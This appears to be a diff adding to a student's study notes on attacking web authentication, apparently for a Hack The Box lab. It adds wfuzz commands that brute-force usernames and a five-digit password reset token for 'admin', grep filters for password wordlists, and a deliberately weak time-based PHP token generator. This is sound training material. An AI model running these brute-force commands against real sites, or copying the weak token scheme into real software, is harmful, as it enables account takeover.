@@ -10,7 +10,16 @@
 
 **User brute forcing**
 
+- Enumerate through Password Reset
+- Enumerate through Registration Form
+- Predictable Usernames eg: support.it
+- Timing Attack
+- Username Existence Inference
+- User Unknown Attack  via wfuzz, brup
+- 
+
 `L3pr3ch4un@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php`
+
 
 - Wordlists: https://github.com/danielmiessler/SecLists/tree/master/Usernames
 
@@ -33,6 +42,41 @@
 
 ## Brute Forcing Passwords
 
+
+| Policy                        | Grep Command                                | Description                                             |
+|-------------------------------|---------------------------------------------|---------------------------------------------------------|
+| At least one uppercase letter | `grep -E '.*[A-Z].*' filename.txt`          | Matches lines with at least one uppercase letter.       |
+| At least one lowercase letter | `grep -E '.*[a-z].*' filename.txt`          | Matches lines with at least one lowercase letter.       |
+| At least one digit            | `grep -E '.*[0-9].*' filename.txt`          | Matches lines with at least one digit.                   |
+| At least one special character | `grep -E '.*[!@#$%^&*()_+{}\[\]:;<>,.?~\\/-].*' filename.txt` | Matches lines with at least one special character. |
+| Minimum length of 8 characters | `grep -E '.{8,}' filename.txt`              | Matches lines with a minimum length of 8 characters.     |
+
+## Predictable Reset Token
+
+![](https://academy.hackthebox.com/storage/modules/80/reset_flow2.png)
+
+**Time based generation**
+
+```
+<?php
+function generate_reset_token($username) {
+  $time = intval(microtime(true) * 1000);
+  $token = md5($username . $time);
+  return $token;
+}
+```
+
+- Script: `https://academy.hackthebox.com/storage/modules/80/scripts/reset_token_time_py.txt`
+
+**Short Tokens**
+
+`L3pr3ch4un@htb[/htb]$ wfuzz -z range,00000-99999 --ss "Valid" "https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ"`
+
+**Weak Cryptographpy**
+
+- **Attacking mt_rand()**: https://github.com/GeorgeArgyros/Snowflake
+
+**Reset Token as Temp Password**
 
 
 ## Refrences
